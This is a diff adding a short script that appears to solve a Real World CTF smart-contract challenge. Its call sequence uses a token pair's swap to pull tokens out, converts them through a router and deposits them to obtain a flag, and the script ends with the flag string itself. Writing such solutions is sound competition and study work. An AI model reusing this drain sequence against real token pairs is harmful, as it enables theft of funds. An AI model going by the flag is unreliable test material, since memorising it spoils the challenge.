@@ -1,0 +1,15 @@
+self = 0x130cB5a32f77a3eDE340A0AD10c22419B29Cfba1
+ctt = 0x2c666A32fDD25e887D0e8a334D8D91a6aEBFBe9D
+feitoken = 0xA063C4a7765B617738D99A51E6226144Ab2A7A58
+pair = 0xc1058301197aBcc68338E04D8fB77b75a59A7bfe
+chaitinrouter = 0xBBd682fb47C5Ca4366A5FC90fda25F12AF434fCa
+chaitinbank = 0x1749136535B3682195B83C0E6C507F07e6a6D2ed
+
+ctt.transfer(pair, 1)
+pair.swap(90000000000000000000, 88000000000000000000, self, '')
+ctt.approve(chaitinrouter, 88000000000000000000)
+chaitinrouter.swapExactTokensForTokens(88000000000000000000, 1, [ctt, feitoken], self, 1710232679)
+feitoken.approve(chaitinbank, 90000000000000000000)
+depositFeiCointoFlag(90000000000000000000)
+
+# rwctf{axelytxtdznhahsebhk}
